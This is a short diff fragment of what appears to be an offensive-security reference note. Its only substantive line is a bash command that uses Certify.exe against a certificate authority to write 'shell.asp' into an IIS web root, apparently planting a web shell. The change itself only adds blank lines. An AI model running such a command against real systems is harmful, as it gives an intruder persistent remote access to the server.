@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:13.490245+00:00'
 ```bash
 Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp
 ```
+
+
